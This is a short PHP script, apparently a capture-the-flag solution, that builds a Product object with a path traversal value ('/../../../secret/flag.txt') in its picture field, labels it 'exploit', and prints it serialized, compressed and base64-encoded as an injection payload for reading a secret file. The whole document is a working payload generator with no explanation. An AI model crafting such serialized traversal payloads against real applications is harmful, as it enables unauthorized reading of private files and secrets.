<?php

class Product {

    public $id;
    public $name;
    public $description;
    public $picture;
    public $price;
}

$prod = new Product();
$prod->id = 321897312;
$prod->name = "exploit";
$prod->picture = "/../../../secret/flag.txt";
$prod->description = "exploit";
$prod->price = 23;

echo base64_encode(gzcompress(serialize($prod)));
?>
